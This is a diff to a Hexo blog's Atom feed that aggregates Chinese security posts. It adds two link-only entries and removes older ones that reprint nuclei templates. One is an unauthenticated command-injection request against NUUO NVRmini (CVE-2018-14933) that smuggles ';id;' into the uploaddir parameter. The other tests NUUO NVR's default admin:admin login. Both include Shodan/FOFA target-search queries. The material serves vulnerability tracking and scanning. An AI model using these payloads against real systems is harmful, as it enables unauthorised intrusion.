@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-17T02:45:36.698Z</updated>
+  <updated>2025-06-17T03:38:41.960Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,60 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>巴拉圭正成为网络犯罪分子的目标--740 万份公民记录待售</title>
+    <link href="http://example.com/2025/06/17/weixin_2377338363/"/>
+    <id>http://example.com/2025/06/17/weixin_2377338363/</id>
+    <published>2025-06-17T03:38:41.966Z</published>
+    <updated>2025-06-17T03:38:41.960Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> OSINT情报分析师</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/cn9LoEUSVxVdsJSdAB_l3Q">https://mp.weixin.qq.com/s/cn9LoEUSVxVdsJSdAB_l3Q</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; OSINT情报分析师&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/cn9LoEUSVxVdsJSdAB_l3Q&quot;&gt;https://mp.weixi</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="OSINT情报分析师" scheme="http://example.com/tags/OSINT%E6%83%85%E6%8A%A5%E5%88%86%E6%9E%90%E5%B8%88/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>GEO ssrf漏洞 (CVE-2024-29198)</title>
+    <link href="http://example.com/2025/06/17/weixin_622939162/"/>
+    <id>http://example.com/2025/06/17/weixin_622939162/</id>
+    <published>2025-06-17T03:27:59.212Z</published>
+    <updated>2025-06-17T03:27:59.209Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> Nday Poc</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/TXVVEfdeu1FuULUQXxiKCg">https://mp.weixin.qq.com/s/TXVVEfdeu1FuULUQXxiKCg</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; Nday Poc&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/TXVVEfdeu1FuULUQXxiKCg&quot;&gt;https://mp.weixin.</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="Nday Poc" scheme="http://example.com/tags/Nday-Poc/"/>
+    
+  </entry>
   
   <entry>
     <title>Fastjson 反序列化漏洞</title>
@@ -482,60 +536,6 @@
       
       
     <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; PhotoPrism 默认登录漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞类型：&lt;</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="弱口令" scheme="http://example.com/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>NUUO NVRmini 远程命令执行漏洞</title>
-    <link href="http://example.com/2025/06/16/github_2272276987/"/>
-    <id>http://example.com/2025/06/16/github_2272276987/</id>
-    <published>2025-06-16T17:18:17.699Z</published>
-    <updated>2025-06-16T17:18:17.697Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> NUUO NVRmini 远程命令执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2018-14933</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> NUUO NVRmini 存在未认证的远程命令执行漏洞，攻击者可以通过操纵upgrade_handle.php文件中的uploaddir参数执行任意命令。</p><p><strong>产品厂商：</strong> NUUO</p><p><strong>产品名称：</strong> NUUO NVRmini</p><p><strong>搜索语法：</strong> title:”NUUO”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/66755dd3873f1dc61d8ee4259cfbdf7be0562dc1/http%2Fcves%2F2018%2FCVE-2018-14933.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/66755dd3873f1dc61d8ee4259cfbdf7be0562dc1/http%2Fcves%2F2018%2FCVE-2018-14933.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVE-2018-14933</span><br><br><span class="hljs-attribute">info</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">NUUO NVRmini - Remote Command Execution</span><br>  <span class="hljs-attribute">author</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ritikchaddha</span><br>  <span class="hljs-attribute">severity</span><span class="hljs-punctuation">:</span> <span class="hljs-string">critical</span><br>  <span class="hljs-attribute">description</span><span class="hljs-punctuation">:</span> <span class="hljs-string">|</span><br>    <span class="hljs-attribute">NUUO NVRmini is vulnerable to unauthenticated remote command execution through the upgrade_handle.php file. The vulnerability allows an attacker to execute arbitrary commands by manipulating the uploaddir parameter.</span><br><span class="hljs-attribute">  reference</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://www.exploit-db.com/exploits/45070</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://www.cve.org/CVERecord?id=CVE-2018-14933</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://nvd.nist.gov/vuln/detail/CVE-2018-14933</span><br>  <span class="hljs-attribute">metadata</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">max-request</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1</span><br>    <span class="hljs-attribute">shodan-query</span><span class="hljs-punctuation">:</span> <span class="hljs-string">title:&quot;NUUO&quot;</span><br>    <span class="hljs-attribute">fofa-query</span><span class="hljs-punctuation">:</span> <span class="hljs-string">title=&quot;NUUO&quot;</span><br>  <span class="hljs-attribute">tags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cve,cve2018,nuuo,rce,kev</span><br><br><span class="hljs-attribute">http</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">method: GET</span><br>    <span class="hljs-attribute">path</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/upgrade_handle.php?cmd=writeuploaddir&amp;uploaddir=%27;id;%27&quot;</span><br><br>    <span class="hljs-attribute">matchers-condition</span><span class="hljs-punctuation">:</span> <span class="hljs-string">and</span><br>    <span class="hljs-attribute">matchers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: regex</span><br>        <span class="hljs-attribute">regex</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;uid=[0-9]+.*gid=[0-9]+.*&quot;</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: status</span><br>        <span class="hljs-attribute">status</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">200</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; NUUO NVRmini 远程命令执行漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>NUUO NVR 默认登录凭证漏洞</title>
-    <link href="http://example.com/2025/06/16/github_261197415/"/>
-    <id>http://example.com/2025/06/16/github_261197415/</id>
-    <published>2025-06-16T17:18:03.278Z</published>
-    <updated>2025-06-16T17:18:03.273Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> NUUO NVR 默认登录凭证漏洞</p><p><strong>漏洞类型：</strong> 弱口令</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> NUUO NVR系统经常部署有默认凭证（admin:admin）。此模板检测使用这些默认凭证的系统。</p><p><strong>产品厂商：</strong> NUUO</p><p><strong>产品名称：</strong> NUUO NVR</p><p><strong>搜索语法：</strong> title:”NUUO”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/c82cb02883a8b0638e9ec14fc2428f7d742b0fc6/http%2Fdefault-logins%2Fnuuo-nvr-default-login.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/c82cb02883a8b0638e9ec14fc2428f7d742b0fc6/http%2Fdefault-logins%2Fnuuo-nvr-default-login.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> nuuo-nvr-default-login<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> NUUO NVR <span class="hljs-operator">-</span> Default Login<br>  <span class="hljs-params">author:</span> ritikchaddha<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> |<br>    NUUO NVR systems are often deployed <span class="hljs-keyword">with</span> default credentials (admin:admin).This template detects systems using these default credentials.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> http:<span class="hljs-operator">//</span>www.nuuo.com<span class="hljs-symbol">/</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">shodan-query:</span> title:<span class="hljs-string">&quot;NUUO&quot;</span><br>    <span class="hljs-params">fofa-query:</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;NUUO&quot;</span><br>  <span class="hljs-params">tags:</span> nuuo,nvr,default-login,misconfig<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">username:</span> admin<br>  <span class="hljs-params">password:</span> admin<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/login.php</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/login.php</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">language</span><span class="hljs-operator">=</span>en&amp;user<span class="hljs-operator">=</span>&#123;&#123;username&#125;&#125;&amp;pass<span class="hljs-operator">=</span>&#123;&#123;password&#125;&#125;&amp;submit<span class="hljs-operator">=</span>Login<br><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/setting.php</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;contains_all(body_3, &#x27;cmd=logout&#x27;, &#x27;v_settings&#x27;)&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;status_code_3 == 200 &amp;&amp; status_code_2 == 302&quot;</span><br>        <span class="hljs-params">condition:</span> and<br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; NUUO NVR 默认登录凭证漏洞&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;漏洞类型：&lt;</summary>
       
     
